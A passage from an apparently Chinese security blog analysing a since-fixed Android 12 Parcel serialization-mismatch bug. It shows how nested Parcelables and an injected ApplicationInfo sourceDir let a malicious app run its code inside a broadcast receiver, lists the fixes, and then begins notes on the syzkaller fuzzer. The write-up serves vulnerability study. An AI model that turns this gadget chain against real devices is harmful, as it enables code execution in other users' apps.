mHierarchyOps = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">WindowContainerTransaction</span><span class="params">(Parcel in)</span> &#123;</span><br><span class="line">        in.readMap(mChanges, <span class="literal">null</span> <span class="comment">/* loader */</span>);</span><br><span class="line">        in.readList(mHierarchyOps, <span class="literal">null</span> <span class="comment">/* loader */</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeToParcel</span><span class="params">(<span class="meta">@NonNull</span> Parcel dest, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">        dest.writeMap(mChanges);</span><br><span class="line">        dest.writeList(mHierarchyOps);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NonNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Creator&lt;WindowContainerTransaction&gt; CREATOR =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Creator</span>&lt;WindowContainerTransaction&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> WindowContainerTransaction <span class="title function_">createFromParcel</span><span class="params">(Parcel in)</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WindowContainerTransaction</span>(in);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示，在写的时候调用<code>writeToParcel()</code>函数，在读的时候调用<code>CREATOR.createFromParcel()</code>函数。<code>Parcelable</code>接口的实现需要确保<code>createFromParcel()</code>函数读取的数据与<code>writeToParcel()</code>函数写入的数据一致，否则后续的读取将要出错。</p>
<p>这样的类可以通过以下方式读取&#x2F;写入<code>Parcel</code>：</p>
<ul>
<li>直接调用 <code>obj.writeToParcel(parcel, 0)</code> &#x2F; <code>obj = WindowContainerTransaction.CREATOR.createFromParcel()</code>，这经常用于类是已知的，比如，当<code>Parcelable</code>拥有不同的<code>Parcelable</code>字段，或者当定义RPC方法时由AIDL生成的包含以<code>Parcelable</code>为参数的代码。</li>
<li>通过 <code>Parcel.writeParcelable</code>&#x2F;<code>readParcelable</code>。<code>writeParcelable</code>首先写入类的名称，然后调用<code>Parcelable</code>接口的<code>writeToParcel</code>方法。<code>readParcelable</code>读取写入的类的名称，在提供的<code>ClassLoader</code>或<code>BOOTCLASSPATH</code>（提供的参数为null）中查找该类名。一旦找到该类，则通过其静态字段<code>CREATOR</code>获取<code>Parcelable.Creator</code>实例（被用于读取这个类）<em>。另外， 当使用<code>readParcelable</code>方法时，它可以读取类路径中的任何<code>Parcelable</code>，因为要创建的对象的名称是从同一个<code>Parcel</code>中读取的。</em><ul>
<li><code>readParcelable</code>被许多其他的<code>Parcel</code>方法所使用，例如上面的例子中看到的<code>readList</code>通过<code>readValue</code>读取元素，这是<code>Parcel</code>中最通用的传输对象的方法，它使用的方式之一就是通过<code>readParcelable</code>。在上面的例子中，由于Java的类型清除，<code>ArrayList&lt;HierarchyOp&gt; mHierarchyOps</code>字段实际上可以包含<code>Parcel</code>支持的任何对象，而不仅仅是那些与通用类型声明中指定的类型兼容的对象。</li>
</ul>
</li>
</ul>
<h2 id="BroadcastReceiver"><a href="#BroadcastReceiver" class="headerlink" title="BroadcastReceiver"></a>BroadcastReceiver</h2><p>从开发者角度来看，<code>BroadcastReceiver</code> 的工作方式如下：应用程序调用<code>sendBroadcast</code> 发送广播，当广播的Intent与 <code>AndroidManifest.xml</code>中定义的 <code>&lt;receiver&gt;</code> 匹配上以后，系统将启动接收该广播的应用程序， 将<code>&lt;receiver android:name&gt;</code>属性中定义的<code>BroadcastReceiver</code>子类实例化，然后调用<code>onReceive</code>方法。</p>
<p>接收广播的过程中与<code>system_server</code>发生的通信：</p>
<ol>
<li>当应用进程开始启动时，将调用<code>IActivityManager.attachApplication()</code>，通过这样，传递<code>ApplicationThread</code>句柄，系统用这个句柄来告诉应用进程要做什么。</li>
<li>当系统想在应用进程中执行清单中注册的<code>BroadcastReceiver</code>时，它使用上面提到的<code>IApplicationThread</code>调用<code>scheduleReceiver</code>方法。这个方法有多个参数，但这里最重要的是前两个：<ol>
<li><code>Intent intent</code>，在调用<code>sendBroadcast()</code>时传递给系统的。</li>
<li><code>ActivityInfo info</code>，它包含了要执行的组件的信息。这个参数的值是由系统从包管理器服务中获取的。最重要的是，在这个参数中传递的数据包括处理收到的广播的Java类的文件路径。</li>
</ol>
</li>
</ol>
<p><strong>利用路径：调用<code>sendBroadcast()</code>，传递一个<code>Intent</code>，这将导致导致调用<code>scheduleReceiver</code>的应用程序接收到一个被篡改的<code>ActivityInfo</code>。</strong></p>
<p><strong>需要注意的是，这种新的利用途径在Android 12中变得可行</strong>，因为以前没有办法在<code>Intent</code>中放入任意的<code>Parcelable</code>（<code>Intent</code>的<code>extra</code>不算，因为它们被放入<code>Bundle</code>中，<code>Bundle</code>的整个长度被写入<code>Parcel</code>中，并作为单个<code>blob</code>被读取，所以<code>extra</code>不会导致它们包含的<code>Intent</code>对象解析出错）。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="writeToParcel-createFromParcel"><a href="#writeToParcel-createFromParcel" class="headerlink" title="writeToParcel&#x2F;createFromParcel"></a>writeToParcel&#x2F;createFromParcel</h2><p>如上所述，<code>Parcelable</code>接口的实现需要确保<code>createFromParcel()</code>函数读取的数据与<code>writeToParcel()</code>函数写入的数据一致。每当<code>BOOTCLASSPATH</code>中存在一个可以违反该约定的<code>Parcelable</code>时，就会产生一个漏洞，因为可能导致以下情况的发生：</p>
<ol>
<li>恶意应用程序向<code>system_server</code>发送一个<code>Bundle</code> 或<code>Parcelable</code>，其中包含有问题的<code>Parcelable</code>实例以及专门构建的数据，这些数据将在步骤3中读取，但在步骤2中传递。</li>
<li><code>system_server</code>验证<code>Bundle</code>是安全的，然后转发，或者<code>system_server</code>将提供的<code>Parcelable</code>传递给AIDL方法，该方法的下一个参数中也有关键数据（如果该参数中收到的数据可能被修改，将导致安全问题）。</li>
<li>另一个应用程序从<code>system_server</code>接收数据并信任它，但由于错误的序列化，它实际看到的数据与<code>system_server</code>打算发送的数据不同。</li>
</ol>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>大多数时候，<code>writeToParcel</code>&#x2F;<code>createFromParcel</code>不匹配的情况是，在这些方法中的一个字段被遗忘或写了两次，在这种情况下，发送这样的对象总是会触发不匹配。</p>
<p>接下来看看有漏洞的类（<a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/hardware/camera2/params/OutputConfiguration.java;drc=46c390a1c695e2dc458cb889e40559f259f60aed">源码</a>如下，标有<code>//</code>的代码是手动添加的，因为在作者写writeup时它们还不在AOSP中）（这里是最初<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/a69b1bc58b0838e06deefb190e226774a34671e6%5E%21/#F10">引入漏洞的提交</a>，但它是在Android 12发布后发布的）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.hardware.camera2.params;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">OutputConfiguration</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">OutputConfiguration</span><span class="params">(<span class="meta">@NonNull</span> Parcel source)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rotation</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">surfaceSetId</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">surfaceType</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> source.readInt();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDeferred</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isShared</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;Surface&gt; surfaces = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Surface&gt;();</span><br><span class="line">        source.readTypedList(surfaces, Surface.CREATOR);</span><br><span class="line">        <span class="type">String</span> <span class="variable">physicalCameraId</span> <span class="operator">=</span> source.readString();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isMultiResolution</span> <span class="operator">=</span> source.readInt() == <span class="number">1</span>; <span class="comment">// New in Android 12</span></span><br><span class="line">        ArrayList&lt;Integer&gt; sensorPixelModesUsed = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(); <span class="comment">// New in Android 12</span></span><br><span class="line">        source.readList(sensorPixelModesUsed, Integer.class.getClassLoader()); <span class="comment">// New in Android 12</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// SNIP: copy values from variables set above to fields of this class</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="meta">@android</span>.annotation.NonNull Parcelable.Creator&lt;OutputConfiguration&gt; CREATOR =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Parcelable</span>.Creator&lt;OutputConfiguration&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputConfiguration <span class="title function_">createFromParcel</span><span class="params">(Parcel source)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">OutputConfiguration</span> <span class="variable">outputConfiguration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputConfiguration</span>(source);</span><br><span class="line">                <span class="keyword">return</span> outputConfiguration;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.e(TAG, <span class="string">&quot;Exception creating OutputConfiguration from parcel&quot;</span>, e);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputConfiguration[] newArray(<span class="type">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OutputConfiguration</span>[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeToParcel</span><span class="params">(Parcel dest, <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dest == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;dest must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest.writeInt(mRotation);</span><br><span class="line">        dest.writeInt(mSurfaceGroupId);</span><br><span class="line">        dest.writeInt(mSurfaceType);</span><br><span class="line">        dest.writeInt(mConfiguredSize.getWidth());</span><br><span class="line">        dest.writeInt(mConfiguredSize.getHeight());</span><br><span class="line">        dest.writeInt(mIsDeferredConfig ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        dest.writeInt(mIsShared ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        dest.writeTypedList(mSurfaces);</span><br><span class="line">        dest.writeString(mPhysicalCameraId);</span><br><span class="line">        dest.writeInt(mIsMultiResolution ? <span class="number">1</span> : <span class="number">0</span>); <span class="comment">// New in Android 12</span></span><br><span class="line">        dest.writeList(mSensorPixelModesUsed); <span class="comment">// New in Android 12</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Surface&gt; mSurfaces;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mRotation;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mSurfaceGroupId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mSurfaceType;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Size mConfiguredSize;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredFormat;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredDataspace;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mConfiguredGenerationId;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> mIsDeferredConfig;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsShared;</span><br><span class="line">    <span class="keyword">private</span> String mPhysicalCameraId;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> mIsMultiResolution; <span class="comment">// New in Android 12</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; mSensorPixelModesUsed; <span class="comment">// New in Android 12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如前面讨论<code>WindowContainerTransaction</code>例子时所说，<code>readList</code>实际上可以用<code>Parcel</code>支持的任何对象来填充列表，而不仅仅是符合通用声明的对象（<code>ArrayList&lt;Integer&gt;</code>）。然而，由于我们只是将这个类作为序列化小工具链的一部分，而不是真正使用它，除了读写<code>Parcel</code>，这个字段不会被用于其他任何事情（而使用<code>ArrayList</code>中的元素，而这些元素与它的泛型声明不匹配，无论如何都只会导致<code>ClassCastException</code>）。</p>
<p>在这个类中，<code>createFromParcel</code>中也有一个<code>try-catch</code>，这意味着如果在读取过程中抛出一个异常，对<code>OutputConfiguration</code>的读取将被停止，对包含<code>OutputConfiguration</code>的对象的读取将继续进行。当这种情况发生时，整个<code>OutputConfiguration</code>将被写入<code>Parcel</code>，但它将<strong>只被读到异常发生的点</strong>。这就造成了不匹配。</p>
<p>为了构建这样的<code>Parcelable</code>，现在需要找到一些东西放在<code>mSensorPixelModesUsed</code>中，在<code>system_server</code>中成功读取（因为这个对象是通过<code>Parcel</code>从攻击者应用中接收的），在<code>system_server</code>中成功写入，然后在受害者应用中解析<code>Parcel</code>失败并抛出一个<code>Exception</code>。</p>
<p>其中一个方法是使用存在于<code>system_server</code>中但不在应用程序中的类，这样尝试反序列化它就会导致<code>ClassNotFoundException</code>。但是不能从<code>system_server</code>中<code>Parcelable</code>，因为<code>readParcelable</code>没有明确指定<code>ClassLoader</code>只会搜索<code>BOOTCLASSPATH</code>（<code>BOOTCLASSPATH</code>不包含<code>system_server</code>中特定的类）。解决方法是使用一个可序列化的类，因为<code>ObjectInputStream</code>会从堆栈中第一个非<code>BOOTCLASSPATH</code>方法中挑选<code>ClassLoader</code>。</p>
<p>这里选择<code>PackageManagerException</code>，然而在使用它之前，还需要做一件事。在<code>OutputConfiguration</code>构造函数中，当<code>readList</code>被调用时，参数<code>loader</code>被明确设置为<code>Integer.class.getClassLoader()</code>。<code>loader</code>被传播到<code>readValue()</code>，然后到<code>readSerializable()</code>，如果<code>loader</code>不为空的，它就会被用来代替来自<code>ObjectInputStream</code>的<code>resolveClass</code>（<code>c != null</code>检查没有任何作用，因为当<code>Class.forName</code>没有找到类时，它会抛出异常而不是返回空）。</p>
<p><strong>思路是将<code>PackageManagerException</code>包裹在一些<code>Parcelable</code>中，在不指定<code>ClassLoader</code>的情况下进行<code>readList</code>。</strong></p>
<p>因此有以下对象：</p>
<ul>
<li><code>OutputConfiguration</code><ul>
<li><code>mSensorPixelModesUsed.get(0) = WindowContainerTransaction</code><ul>
<li><code>mHierarchyOps.get(0) = PackageManagerException</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>现在这样的对象可以在<code>system_server</code>中成功反序列化：当<code>WindowContainerTransaction</code>调用<code>readList</code>时，它会尝试使用<code>system_server</code>的<code>ClassLoader</code>（不是<code>BootClassLoader</code>）找到<code>PackageManagerException</code>类，因为它可以在堆栈跟踪中找到它。该类加载器恰好出现在堆栈跟踪中，但以下所有方法都不在<code>system_server</code>类路径中：<code>Binder#execTransact()</code>、AIDL生成的<code>IActivityManager$Stub#onTransact()</code>以及所有使用的<code>Parcelable</code>类的方法，但在堆栈跟踪中，有一个在<code>system_server</code>中声明的方法：在<code>ActivityManagerService</code>中重写的<code>onTransact</code>。因此，<code>system_server</code>可以读取并随后将这样的对象写入<code>Parcel</code>，当目标应用程序试图读取它时，<code>PackageManagerException</code>类将不可用，因此<code>ClassNotFoundException</code>将被抛出，被包装成<code>RuntimeException</code>，然后被<code>OutputConfiguration</code>的 <code>CREATOR</code>捕获。</p>
<p>但是还没有触发<strong>不匹配</strong>，因为<code>OutputConfiguration.writeToParcel</code>没有留下任何未读数据时，异常被捕获了，但是可以很容易地在<code>mSensorPixelModesUsed</code>列表中添加另一个项目，该项目将通过<code>Parcel.writeValue</code>写入，并在读取<code>OutputConfiguration</code>后留下未读数据。</p>
<p><strong>从Intent对象中触发</strong></p>
<p>因为它将被<code>system_server</code>传递到AIDL方法中，该方法的第一个参数是<code>Intent</code>，第二个参数是执行信息，所以第一个参数中传递的<code>Intent</code>的序列化&#x2F;反序列化会导致第二个参数中的值被改变。</p>
<p>在<code>Intent.readFromParcel()</code>中，所有的值都是通过专门的类型方法来读取的，所以在这里不能指定自定义的<code>Parcelable</code>类。</p>
<p>在<code>Intent</code>中，有一个嵌套的<code>ClipData</code>，并且从Android 12开始，在<code>ClipData$Item</code>中有一个新的字段<code>ActivityInfo mActivityInfo</code>。（这里是引入这个字段的<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/c932060175133e266233f1c7667dc69470fbc62e%5E%21/#F2">提交</a>，这个字段是在<code>ClipData(Parcel in)</code>构造函数中通过<code>in.readTypedObject(ActivityInfo.CREATOR)</code>读取的）</p>
<p>然后在<code>ActivityInfo(Parcel source)</code>构造函数中，也没有办法放入自定义的<code>Parcelable</code>，但是由于<code>ActivityInfo</code>是从<code>ComponentInfo</code>扩展而来，它有<code>applicationInfo</code>字段。</p>
<p>最后，在 <code>ApplicationInfo</code> 中有一个<code> SparseArray&lt;int[]&gt; splitDependencies</code> 字段，它是通过<code> readSparseArray</code> 读取的，而后者又使用 <code>readValue</code> 来读取 <code>SparseArray</code> 项目。</p>
<p>可以将<code>OutputConfiguration</code>放在<code>splitDependencies</code>中，但是读取<code>splitDependencies</code>之后会有一些<code>readString8()</code>的调用，而且在发生不匹配之后，最好能完全控制未被接受的数据，这样我们就可以直接将空字符串放在那里，而不用担心未被接受的数据的不同解释。</p>
<p>要做到这一点，首先需要在<code>OutputConfiguration.mSensorPixelModesUsed</code>中放置一些原始数据，这些数据将通过<code>writeValue</code>写入。这里选择使用<code>Bundle</code>。这样，在未消耗的数据中，会留下：</p>
<ol>
<li><code>writeValue VAL_BUNDLE</code>标签</li>
<li>原始数据的长度（此链接也适用于此列表中的其余项目）</li>
<li><code>BUNDLE_MAGIC</code></li>
<li>通过<code>Parcel.appendFrom</code>逐字传递的原始数据</li>
</ol>
<p>所以我们有三个<code>Parcel.writeInt</code>的项目没有消耗掉，我们可以通过将<code>OutputConfiguration</code>包裹在一些<code>Parcelable</code>中，在读取时读取任意的<code>Parcelable</code>值和三个<code>ints</code>，来摆脱它们。<code>ZenPolicy CREATOR</code>中存在这样的方法。</p>
<p>最后，我们有以下对象的层次结构（存在于<code>system_server</code>中，并且它试图传递给<code>scheduleReceiver</code>）：</p>
<ul>
<li><code>Intent</code><ul>
<li><code>mClipData = ClipData</code><ul>
<li><code>mItems.get(0).mActivityInfo = ActivityInfo</code><ul>
<li><code>applicationInfo = ApplicationInfo</code><ul>
<li><code>splitDependencies.get(0) = ZenPolicy</code><ul>
<li><code>mVisualEffects.get(0) = OutputConfiguration</code><ul>
<li><code>mSensorPixelModesUsed.get(0) = WindowContainerTransaction</code><ul>
<li><code>mHierarchyOps.get(0) = PackageManagerException</code></li>
</ul>
</li>
<li><code>mSensorPixelModesUsed.get(1) = Bundle</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>这是由<code>system_server</code>写的。然后，接收应用程序正常读取<code>PackageManagerException</code>的所有数据（包括<code>readSerializable</code>数据），然而在读取<code>PackageManagerException</code>的<code>Serializable</code>数据后，一个异常被抛出，并且取消了对<code>OutputConfiguration</code>以下所有数据的读取，留下<code>Bundle</code>未读。读取继续进行到<code>ZenPolicy</code>，它消耗了<code>Bundle</code>中原始数据之前的三个<code>ints</code>。然后<code>ApplicationInfo</code>的读取继续进行，读取的数据是之前在<code>Bundle</code>中逐字传递的原始数据。对原始数据的读取将在这个堆栈中的其他对象（<code>ApplicationInfo</code>、<code>ActivityInfo</code>、<code>ClipData</code>和<code>Intent</code>）中继续进行，然后这些原始数据将被用于读取下一个<code>handleReceiver</code>方法参数。</p>
<p><strong>handleReceiver</strong></p>
<p>正如刚才所说，现在剩下的<code>scheduleReceiver</code>参数是从攻击者控制的缓冲区中读取的。首先，<code>scheduleReceiver</code>将所有参数的值打包并使用<code>sendMessage()</code>将执行传递给主线程。接下来，在主线程上调用<code>handleReceiver</code>，<code>handleReceiver</code>调用<code>getPackageInfoNoCheck</code>，将其作为<code>ActivityInfo</code>的一部分传递给<code>scheduleReceiver</code>参数的<code>ApplicationInfo</code>。</p>
<p><code>getPackageInfo</code>检查给定名称的包是否已经存在于缓存中，如果没有，则构建新的<code>LoadedApk</code>实例，将先前收到的<code>ApplicationInfo</code>对象传递给它。（由于想要创建新的<code>LoadedApk</code>，所以在这个过程中使用了先前没有看到的包的包名）</p>
<p>然后使用<code>ContextImpl.getClassLoader()</code>方法，该方法首先委托给<code>mPackageInfo.getClassLoader()</code>，<code>mPackageInfo</code>是在上一段构建的<code>LoadedApk</code>。</p>
<p>然后是&#96;&#96;createOrUpdateClassLoaderLocked<code>，它调用</code>makePaths<code>将</code>ClassLoader<code>中要使用的路径填充到</code>zipPaths<code>中，然后将它们连接起来并分配给zip变量，再传递给</code>createClassLoader&#96;。</p>
<p><code>makePaths</code>使用<code>ApplicationInfo</code>的信息填充<code>zipPaths</code>，最重要的是，这包括<code>sourceDir</code>。攻击者应用程序使注入的<code>ApplicationInfo</code>与<code>sourceDir</code>设置为自己的<code>apk</code>的路径，因此<code>receiver</code>类将实际从攻击者<code>apk</code>中加载。这直接导致了在接收广播的应用程序中执行攻击者控制的代码。</p>
<p><strong>隐藏的API检查</strong></p>
<p>还有一件事需要被绕过：隐藏的API检查。但这些不是问题（因为应用程序可以使用NDK，并直接调用底层系统调用），但在这种情况下，通过手动将数据写入<code>Parcel</code>，然后使用<code>readParcelable</code>来构建精心制作的<code>ClipData</code>来绕过它们。这样的<code>ClipData</code>通常可以被附在<code>Intent上</code>，然后传递给<code>sendBroadcast()</code>，因此发送广播本身只需使用公共API即可完成。</p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>Android 12发布：</p>
<ul>
<li>从<code>OutputConfiguration</code>和相关类中删除了异常捕获功能。</li>
<li><code>OutputConfiguration#mSensorPixelModesUsed</code>不再通过<code>writeValue</code>写入。</li>
<li><code>ClipData#mActivityInfo</code>不再被写入<code>Parcel</code>，除非在写入过程中明确要求（因此<code>Intent</code>不再包含来自<code>BOOTCLASSPATH</code>的任意<code>Parcelables</code>，消除了这种利用技术）。</li>
</ul>
<p>在写这篇文章时，只出现在主分支上，不在发布的版本中，可能会出现在Android 13中（不在12L中）：</p>
<ul>
<li>在<code>Parcel</code>上有新的List读取方法，可以检查元素的类型，没有类型的版本已经被标记为废弃。</li>
<li>新的方法<code>Parcel#enforceNoDataAvail()</code>，检查<code>Parcel</code>中是否有未读的数据，显然AIDL在读取RPC调用参数后会使用这个方法。</li>
<li>在<code>Bundle</code>中的每个项目都将单独保存其长度。这几乎扼杀了整个bug类。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/17/syzkaller%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/17/syzkaller%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">syzkaller学习笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-17 20:48:35" itemprop="dateCreated datePublished" datetime="2022-04-17T20:48:35+08:00">2022-04-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2024-11-03 22:56:36" itemprop="dateModified" datetime="2024-11-03T22:56:36+08:00">2024-11-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前看过AFL++的源码，发现想要自己重新写的话还是很复杂，现在学习一下syzkaller，看看有没有可能进行定制。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>syzkaller系统的流程结构如下图所示；红色标签表示相应的配置选项。</p>
<img src="../pictures/process_structure.png" alt="process_structure" style="zoom: 67%;" />

<p><code>syz-manager</code>进程启动、监控和重启几个虚拟机实例，并在虚拟机内启动<code>syz-fuzzer</code>进程。<code>syz-manager</code>负责持久性语料库和崩溃存储。它运行在一个具有稳定内核的主机上，不会出现白噪声模糊器的负载。</p>
<p><code>syz-fuzzer</code>进程在可能不稳定的虚拟机中运行。<code>syz-fuzzer</code>指导模糊处理过程（输入生成、突变、最小化等），并通过RPC将触发新覆盖率的输入发送至<code>syz-manager</code>进程。它还会启动瞬时的<code>syz-executor</code>进程。</p>
<p>每个<code>syz-executor</code>进程执行一个输入（一连串的系统调用）。它从<code>syz-fuzzer</code>进程中接受要执行的程序，并将结果发送回来。它被设计成尽可能简单（不干扰模糊处理过程），用C++编写，编译成静态二进制，使用共享内存进行通信。</p>
<h2 id="系统调用描述"><a href="#系统调用描述" class="headerlink" title="系统调用描述"></a>系统调用描述</h2><p><code>syz-fuzzer</code>进程根据系统调用描述，生成由<code>syz-executor</code>执行的程序。</p>
<h2 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h2><p>Syzkaller是一个覆盖率导向的fuzzer。</p>
